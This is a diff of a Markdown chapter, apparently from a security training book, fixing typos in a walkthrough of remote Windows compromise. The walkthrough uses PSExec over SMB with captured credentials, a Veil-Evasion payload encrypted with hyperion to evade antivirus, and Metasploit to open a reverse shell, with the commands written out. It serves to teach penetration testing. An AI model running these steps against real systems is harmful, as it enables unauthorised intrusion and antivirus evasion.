@@ -43,7 +43,7 @@ _Todo_
 PSExec was written by Mark Russinovich as part of the Sysinternals tool suite. PSExec the tool allows you to execute programs on remote Windows systems without having to install anything on the server you want to manage or hack. Also being a telnet replacement.  
 PSExec requires a few things on the target system:
 
-1. The Server Message Bloack (SMB) service must be available and reachable (not blocked by a fire wall for example)
+1. The Server Message Block (SMB) service must be available and reachable (not blocked by a fire wall for example)
 2. File and Print Sharing must be enabled
 3. Simple File Sharing must be disabled
 4. The Admin$ share (which maps to the Windows directory) must be available and accessible
@@ -66,7 +66,7 @@ I> This demo differs from the previous in that we don't rely on any of the targe
 I> We open a reverse shell from the victim to us using Metasploit.  
 I> We use Veil-Evasion with the help of hyperion to encrypt our payload to evade AV.  
 I> With this attack you will have had to have obtained the targets username and password or password hash.  
-I> We leverage psexec which expects your binary to be a windows service.
+I> We leverage PSExec which expects your binary to be a windows service.
 I> You can also leverage ARP and DNS spoofing with Ettercap from the previous attack. I haven't included these steps in this play though, although the video assumes they have been included.
 
 {icon=bomb}
@@ -88,13 +88,12 @@ G>
 G> Generate the initial payload:  
 G> `generate`
 G>
-G> Give it a name. I just selected the default of "payload"  
+G> Give it a name. I just selected the default of "payload".  
 G> [Enter]  
-G> Exit out of Veil-Evasion
+G> Exit out of Veil-Evasion.
 G>
 G> `/usr/share/veil-output/compiled/payload[n].exe` needs to be encrypted with hyperion, either on a Windows box or Linux with Wine.  
-G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution.  
-G> The command to run is:  
+G> hyperion encrypts with a weak 128-bit AES key, which decrypts itself by brute force at the time of execution. The command to run is:  
 G> `hyperion.exe -v payload.exe encrypted-payload.exe`  
 G> We then put the encrypted payload somewhere where Metasploit can access it:  
 G> I just copied it back to `/usr/share/veil-output/compiled/encrypted-payload.exe`  
@@ -110,10 +109,12 @@ G> `set rhost <IP address of target>`
 G> `set exe::custom /usr/share/veil-output/compiled/encrypted-payload.exe`  
 G> `set smbuser <target username>`  
 G> `set smbpass <target password>`  
-G> `run`  
-G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.  
-G> Now we’ve got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.
+G> `run`
 G>
+G> The IP addresses and ports need to be the same as you specified in the creating of the payload using Veil-Evasion.  
+G> Now we've got the credentials from a previous exploit. There are many techniques and tools to help capture these, whether you have physical access or not. We just need the username & password or hash which is transmitted across the network for all to see. Also easily obtainable if you have physical access to the machine.
+
+{icon=bomb}
 G> We now run msfconsole with the resource file as parameter:  
 G> `msfconsole -r ~/demo.rc`  
 G> and that's enough to evade AV and get our reverse shell.
